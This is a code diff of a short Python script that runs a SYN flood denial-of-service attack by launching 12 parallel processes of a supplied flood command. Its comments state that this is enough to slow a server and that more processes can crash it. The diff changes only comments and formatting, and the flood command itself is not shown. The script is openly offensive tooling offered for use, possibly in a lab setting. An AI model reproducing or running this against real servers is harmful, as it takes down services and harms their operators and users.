@@ -12,10 +12,14 @@ import subprocess
 import time
 import os
 
-# Function to run a command with Popen and store the process in a list
+
 def run_ddos_syn_flood(command, process_list):
+    """
+    Function to run a command with Popen and store the process in a list
+    """
+    # arbitrary number but it is enough to make the server slows down, more can make the server crash
     number_of_processes = 12
-    for i in range(number_of_processes): # 12 is an arbitrary number but it is enough to make the server slows down
+    for i in range(number_of_processes):
         print("[+] Starting Syn Flood Attack id: {}".format(i))
         process = subprocess.Popen(command)
         process_list.append(process)
@@ -31,7 +35,7 @@ if __name__ == "__main__ ":
     print("[INFO] Press CTRL+C to kill the running processes ...")
 
     try:
-        while(True):
+        while (True):
             time.sleep(1)
     except KeyboardInterrupt as e:
         # Terminate all the processes in the list
@@ -44,4 +48,3 @@ if __name__ == "__main__ ":
             process.wait()
 
         print("All processes terminated")
-
